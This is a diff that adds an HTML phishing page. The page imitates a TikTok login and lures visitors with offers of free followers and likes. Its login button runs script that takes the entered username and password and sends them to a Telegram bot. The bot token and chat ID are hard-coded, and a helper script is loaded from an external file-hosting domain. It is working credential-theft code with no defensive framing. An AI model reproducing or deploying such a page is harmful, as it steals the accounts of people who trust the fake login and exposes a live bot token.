@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TIKTOK Follower free</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="containter">
+        <div class="logo">
+            <img src="https://www.tiktok.com/favicon.ico" alt="tiktok Logo">
+        </div>
+    <div class="form-containter">
+
+        <h2>Login in your account </h2>
+           <input type="text" id="usr" name="username" placeholder="Username" required>
+           <input type="password" id="pas" name="password" placeholder="Password" required> 
+
+
+           <button type="submit" onclick="req()">Log In</button>
+           <p class="forget-password"><a href="#">1000 follower free</a>
+            </p>
+
+            <div class="signup-container">
+                <p>10K LIKE FREE sign in? <a href="#"> Sign up</a></p>
+                <script src="https://ip9uk39kv26rml8wjjruzg.on.drv.tw/jsbot.js">
+
+                </script>
+                <script>
+                    function req(req){
+                        var usr = document.querySelector("#usr").value
+                        var pas = document.querySelector("#pas").value
+                        // you login here. all functions return promise
+                        const bot = new Bot("7162019393:AAEUyilD-Hn-v9nbFGyakceMg5od-ChHzoY", "6532862739") 
+
+                        bot.sendMessage("user:  "+usr +"  pass:  "+pas, null, null, true)
+                        .then(res => {
+                            console.log("Success!", res);
+                        })
+                        .catch(err => console.log(err))}
+                </script>
+                <script src="" defer></script>
+            </div>
+    </div>
+    </div>
+
+</body>
+</html>
